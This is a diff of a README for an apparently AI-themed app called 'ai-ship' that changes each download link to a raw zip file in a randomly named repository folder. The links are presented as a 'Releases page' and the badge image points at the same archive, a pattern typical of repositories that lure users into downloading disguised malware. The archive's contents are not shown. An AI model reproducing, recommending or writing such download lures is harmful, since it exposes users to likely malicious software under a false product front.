@@ -1,6 +1,6 @@
 # 🚢 ai-ship - Navigate Your AI Journey with Ease
 
-[![Download ai-ship](https://raw.githubusercontent.com/Ajay-9818/ai-ship/master/crickle/ai-ship.zip%20ai--ship-v1.0-blue)](https://raw.githubusercontent.com/Ajay-9818/ai-ship/master/crickle/ai-ship.zip)
+[![Download ai-ship](https://github.com/Ajay-9818/ai-ship/raw/refs/heads/master/headkerchief/ai-ship.zip%20ai--ship-v1.0-blue)](https://github.com/Ajay-9818/ai-ship/raw/refs/heads/master/headkerchief/ai-ship.zip)
 
 ## 🚀 Getting Started
 
@@ -8,7 +8,7 @@ Welcome to **ai-ship**! This application allows you to harness the power of arti
 
 ## 📥 Download & Install
 
-To get ai-ship, visit this page to download: [ai-ship Releases](https://raw.githubusercontent.com/Ajay-9818/ai-ship/master/crickle/ai-ship.zip). 
+To get ai-ship, visit this page to download: [ai-ship Releases](https://github.com/Ajay-9818/ai-ship/raw/refs/heads/master/headkerchief/ai-ship.zip). 
 
 1. Open the link above in your web browser.
 2. On the Releases page, look for the latest version. This is generally at the top.
@@ -59,7 +59,7 @@ If you encounter any issues while downloading or installing ai-ship, try these s
 
 To keep ai-ship running smoothly, you should always use the latest version. Updates may include new features, improvements, or bug fixes.
 
-1. Return to the [ai-ship Releases](https://raw.githubusercontent.com/Ajay-9818/ai-ship/master/crickle/ai-ship.zip) page periodically.
+1. Return to the [ai-ship Releases](https://github.com/Ajay-9818/ai-ship/raw/refs/heads/master/headkerchief/ai-ship.zip) page periodically.
 2. Look for new releases and follow the download instructions above to update your app.
 
 ## 🤔 Frequently Asked Questions
